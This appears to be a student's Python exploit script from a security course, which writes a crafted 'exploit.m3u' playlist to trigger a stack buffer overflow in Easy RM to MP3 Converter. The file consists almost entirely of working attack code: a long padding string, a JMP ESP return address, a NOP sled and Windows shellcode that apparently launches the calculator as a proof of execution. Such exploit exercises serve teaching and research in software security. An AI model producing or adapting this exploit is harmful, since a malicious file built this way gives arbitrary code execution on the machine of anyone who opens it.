#!/usr/bin/python
# Lucas TRUCHOT
# CDAISI_FC 2017-2018
# BufferOverflow : Easy RM to MP3 Converter
# Professeur : Franck Ebel
outputfile = "exploit.m3u"
shellcode = "A" * 26088
shellcode += "\x76\xf5\xd1\xb3"[::-1] # JMP ESP
shellcode += "\x90" * 10  # NOP
shellcode += (
    "\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
    "\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
    "\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
    "\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
    "\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
    "\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")
FILE = open(outputfile, "w")
FILE.write(shellcode)
FILE.close()
